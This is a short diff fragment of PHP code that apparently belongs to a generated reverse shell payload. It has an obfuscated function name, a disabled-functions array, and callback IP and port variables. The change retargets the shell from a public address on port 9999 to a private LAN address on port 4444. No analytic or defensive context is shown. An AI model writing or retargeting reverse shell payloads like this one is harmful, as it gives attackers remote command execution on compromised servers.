@@ -9,8 +9,8 @@
         $dis=array();
       }
       
-    $ipaddr='118.209.245.157';
-    $port=9999;
+    $ipaddr='192.168.1.121';
+    $port=4444;
 
     if(!function_exists('lleKsVdVjvH')){
       function lleKsVdVjvH($c){
